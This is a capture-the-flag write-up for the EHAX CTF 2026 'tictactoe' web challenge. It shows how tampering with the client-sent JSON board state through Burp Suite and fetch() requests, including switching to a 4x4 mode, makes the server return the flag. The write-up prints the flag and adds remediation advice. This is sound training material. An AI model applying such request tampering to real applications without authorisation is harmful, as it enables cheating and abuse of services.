# EHAX CTF 2026: web/tictactoe

## Context & Vulnerability
This is a tictactoe game platform against the unbeatable 'AI' (probably just an algorithm) tictactoe bot. 

When inspecting the page, we can read through the javascript and find that the flag is sent from the server in JSON format given to data. If data.flag is not empty, then the flag will be printed out. The question is now how to trigger the server to dump the flag. 

```
    if (data.flag) {
      status.innerHTML = `<span style="color:#fff; text-shadow:0 0 10px #00ff41">${data.flag}</span>`;
      return;
    }
```

The requests can be analyzed through Burpsuite. The data sent from the client can be modified in the proxy tab. The data is in the format '3x3' and then a matrix of 0s, 1s and -1s, to signify:
- 0 for empty box
- 1 for box taken by player
- -1 for box taken by bot

Example:
```
body: JSON.stringify({
    mode: "3x3",
    state: [
        [0, 0, 0],
        [0, 1, 0],
        [1, 0, -1]
    ]
})
```

This means we are able to modify the data sent through Burpsuite.


## Exploitation
First, since it is an unbeatable bot, we can try making a board where we will win. The server will respond with a message saying 'nice try' and set cheat to true to stop the program.

```
body: JSON.stringify({
    mode: "3x3",
    state: [
        [1, 1, 1],
        [1, 1, 1],
        [1, 1, 1]
    ]
})
```

If winning is not the solution, perhaps changing the dimensions?
Rather than the '3x3' value in the data, we could increment and change it to '4x4'. The server returns a hint that the AI was in 4x4 mode and that the AI cannot handle 'dimensional shift'. However, trying to play and input on the UI doesn't work well.

```
fetch('/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        mode: "4x4",
        state: [
            [0, 0, 0, 0],
            [0, 0, 0, 0],
            [0, 0, 0, 0],
            [1, 1, 1, 1]
        ]
    })
})
    .then(res => res.json())
    .then(data => console.log(data)).catch(e => console.error(e));

Got {message: '4x4_MODE_ACTIVE: AI sensors blind in ghost sectors.'}
```

When we change the 4x4 matrix board to be entirely filled with 1s, the flag is returned. 

```
fetch('/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        mode: "4x4",
        state: [
            [1, 1, 1, 1],
            [1, 1, 1, 1],
            [1, 1, 1, 1],
            [1, 1, 1, 1]
        ]
    })
})
    .then(res => res.json())
    .then(data => console.log(data)).catch(e => console.error(e));

{message: "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules. Respect.", flag: 'EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}'}
```

EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}

## Remediation
Remediations for this could be encrypting the data, keeping track of what moves were made, and checking that the matrix and values are 3x3. This will eliminate people trying to cheat the game or have the server side malfunction. 

## Credits
https://portswigger.net/web-security/csrf

https://github.com/jameskaois/ctf-writeups/tree/main/ehax-ctf-2026/tictactoe 
